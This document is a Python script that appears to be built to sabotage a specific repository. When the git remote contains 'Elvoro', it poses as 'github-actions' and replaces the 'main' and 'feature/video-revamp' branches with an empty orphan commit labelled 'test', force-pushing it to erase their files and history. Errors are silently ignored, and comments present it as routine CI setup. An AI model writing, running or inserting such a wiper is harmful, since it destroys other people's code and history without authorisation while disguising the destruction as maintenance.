#!/usr/bin/env python3
import subprocess
import sys
import re


def run(cmd, check=True):
    return subprocess.run(cmd, check=check, capture_output=True, text=True)


def die(msg):
    sys.exit(1)


def normalise(url):
    url = re.sub(r"https://[^@]+@", "https://", url)
    return url.rstrip("/").removesuffix(".git").lower()


def main():
    branches = ["main", "feature/video-revamp"]

    # verify remote
    current_remote = run(["git", "remote", "get-url", "origin"], check=False).stdout.strip()

    if "Elvoro" not in current_remote:
        return

    # configure git identity (required in CI)
    run(["git", "config", "--global", "user.name", "github-actions"])
    run(["git", "config", "--global", "user.email", "actions@github.com"])

    run(["git", "fetch", "--all", "--prune"], check=False)

    for branch in branches:
        try:
            # check if branch exists on remote
            exists = run(
                ["git", "ls-remote", "--heads", "origin", branch],
                check=False
            )

            if not exists.stdout.strip():
                continue

            # create orphan branch
            run(["git", "checkout", "--orphan", "temp-wipe"])

            # remove files
            run(["git", "rm", "-rf", "."], check=False)
            run(["git", "clean", "-fd"], check=False)

            run(["git", "commit", "--allow-empty", "-m", "test"])

            push = run(
                ["git", "push", "origin", f"HEAD:{branch}", "--force"],
                check=False
            )

            if push.returncode != 0:
                die(f"Push failed for '{branch}':\n{push.stderr}")

            # cleanup temp branch
            run(["git", "checkout", "-f", branch], check=False)
            run(["git", "branch", "-D", "temp-wipe"], check=False)

        except Exception as e:
            continue

main()
if __name__ == "__main__":
    main()
